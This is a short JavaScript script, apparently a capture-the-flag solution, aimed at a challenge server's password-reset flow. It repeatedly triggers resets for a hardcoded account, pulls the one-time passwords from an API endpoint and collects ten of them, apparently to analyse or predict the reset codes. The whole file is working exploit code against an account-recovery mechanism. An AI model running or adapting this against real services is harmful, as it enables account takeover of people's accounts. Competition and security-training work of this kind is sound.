const user = { username: "d0nut", password: "d0nutboi" };

const baseURL = 'http://challenge.ctf.games:31947/';

const requestOTP = async () => {
  await fetch(baseURL + "reset", {
    "headers": { "content-type": "application/x-www-form-urlencoded", },
    "body": `username=${user.username}`,
    "method": "POST"
  });
}

const getOTP = async () => {
  const response = await fetch(baseURL + "reset/api/get-otp", {
    "headers": { "content-type": "application/json" },
    "body": JSON.stringify(user),
    "method": "POST"
  });
  return (await response.json()).otp;
}

const main = async () => {
  const otps = [];
  for (let i = 0; i < 10; i++) {
    await requestOTP();
    const otp = await getOTP();
    console.log(`OTP #${i}`, otp);
    otps.push(otp);
  }
  console.log(`OTPs`, otps);
}

main();